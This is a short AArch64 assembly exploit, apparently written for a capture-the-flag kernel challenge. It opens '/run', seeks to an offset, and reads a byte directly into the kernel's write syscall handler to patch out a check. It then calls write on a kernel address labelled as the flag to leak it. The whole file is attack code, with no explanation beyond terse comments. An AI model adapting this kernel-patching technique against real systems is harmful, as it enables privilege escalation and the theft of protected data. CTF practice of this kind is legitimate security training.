.text

.globl _start
_start:
 
   ldr x0,=0x6e75722f   // /run (/bin does not work somehow!)
   mov x1, 0x0
   stp x0, x1, [sp]
   mov x0, sp
   mov x5, 0x340        // SYS_open
   blr x5

   mov x4, x0           // save file descriptior
   mov x1, 0x3a2        // offset of 0x60 in order to change SYS_write to after check
   mov x2, 0x0
   mov x5, 0x364        // SYS_lseek
   blr x5

   mov x0, x4                   // move saved file desc
   ldr x1, =0xffff000000087140  // syscall handler for write
   mov x2, 0x1                  // count
   mov x5, 0x34c                // SYS_read
   blr x5

   ldr x0, =0xffff000000088858  // addr of the flag
   mov x2, 0x36                 // count
   mov x5, 0x310                // SYS_write
   blr x5
